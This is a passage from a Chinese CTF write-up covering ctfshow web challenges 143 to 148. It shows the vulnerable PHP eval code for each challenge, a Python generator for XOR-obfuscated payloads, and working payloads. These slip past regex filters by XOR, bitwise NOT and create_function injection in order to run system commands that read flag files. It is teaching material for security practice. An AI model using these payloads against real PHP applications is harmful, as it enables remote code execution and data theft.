</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="c1"></span>		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">^</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"># author yu22x</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">   
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web144">web144<a hidden class="anchor" aria-hidden="true" href="#web144">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 16:21:15
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">return</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">===</span><span class="mi">1</span><span class="o">?</span><span class="k">true</span><span class="o">:</span><span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题跟143差不多，只是参数交换了一下位置</p>
<p>直接异或出了</p>
<pre tabindex="0"><code>?v1=1&amp;v2=-(&#34;%0c%06%0c%0b%05%0d&#34;^&#34;%7f%7f%7f%7f%60%60&#34;)(&#34;%03%01%0b%00%06%00&#34;^&#34;%60%60%7f%20%60%2a&#34;)&amp;v3=1
</code></pre><h4 id="web145">web145<a hidden class="anchor" aria-hidden="true" href="#web145">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了异或运算符^,同时也ban掉了加减乘除</p>
<p>但是我们还可以考虑构造三目运算符配合取反</p>
<p>payload:</p>
<pre tabindex="0"><code>/?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
</code></pre><h4 id="web146">web146<a hidden class="anchor" aria-hidden="true" href="#web146">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 17:41:33
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&#34;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题把三目运算符也ban了</p>
<p>可以考虑使用位运算符|</p>
<p><img alt="image-20250124223416316" loading="lazy" src="assets/image-20250124223416316.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
</code></pre><h4 id="web147">web147<a hidden class="anchor" aria-hidden="true" href="#web147">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 02:04:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$ctfshow</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctf&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9_]*$/isD&#39;</span><span class="p">,</span><span class="nv">$ctfshow</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$ctfshow</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;show&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>create_function()代码注入</p>
<p>如果我们第二个参数传入 echo 1;}phpinfo();//
就等价于</p>
<pre tabindex="0"><code>function f($a) {
  echo 1;}phpinfo();//
}
从而执行phpinfo()命令
</code></pre><p>那要怎么绕过正则表达式呢</p>
<pre tabindex="0"><code>/^[a-z0-9_]*$/isD
</code></pre><p>这个正则表达式匹配所有的字母数字和下划线</p>
<p>而且由于</p>
<blockquote>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p></blockquote>
<p>所以我们可以通过\create_function()来绕过这个正则表达式</p>
<p>payload:</p>
<pre tabindex="0"><code>GET show=;};system(&#39;cat f*&#39;);/*
POST ctf=\create_function
</code></pre><h4 id="web148">web148<a hidden class="anchor" aria-hidden="true" href="#web148">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-19 03:52:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9_\%</span><span class="se">\\</span><span class="s2">|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="k">function</span> <span class="nf">get_ctfshow_fl0g</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>没ban异或运算符</p>
<p>payload:</p>
<pre tabindex="0"><code>(&#34;%08%02%08%09%05%0d&#34;^&#34;%7b%7b%7b%7d%60%60&#34;)(&#34;%03%01%09%01%06%02&#34;^&#34;%60%60%7d%21%60%28&#34;);
//system(&#34;cat f*&#34;);
</code></pre><h4 id="web149">web149<a hidden class="anchor" aria-hidden="true" href="#web149">#</a></h4>
